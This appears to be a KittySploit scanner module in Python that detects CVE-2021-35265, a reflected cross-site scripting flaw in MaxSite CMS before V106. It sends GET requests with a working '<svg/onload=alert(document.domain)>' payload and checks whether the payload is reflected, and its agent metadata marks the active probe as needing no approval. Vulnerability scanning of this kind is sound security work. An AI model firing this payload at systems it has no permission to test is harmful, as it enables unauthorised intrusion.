#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A reflected cross-site scripting vulnerability in MaxSite CMS before V106 via product/page/* allows remote att."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'MaxSite CMS > V106 - Cross-Site Scripting Detection',
        'description': 'A reflected cross-site scripting vulnerability in MaxSite CMS before V106 via product/page/* allows remote attackers to inject arbitrary web script to a page."',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'maxsite', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/maxsite/cms/issues/414#issue-726249183',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-35265',
            'https://github.com/maxsite/cms/commit/6b0ab1de9f3d471485d1347e800a9ce43fedbf1a',
            'https://github.com/ARPSyndicate/kenzer-templates',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2021-35265',
    }

    def run(self):
        for path in ('/page/hello/1%22%3E%3Csvg/onload=alert(document.domain)%3E', '/page/1%22%3E%3Csvg/onload=alert(document.domain)%3E'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_any = ('><svg/onload=alert(document.domain)>', 'mso-comments-rss">RSS</a>', 'MaxSite CMS', 'feed"><span>RSS</span>',)
            header_any = ('text/html',)
            if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='medium',
                    reason="MaxSite CMS > V106 - Cross-Site Scripting detected",
                    path=path,
                )
                return True
        return False

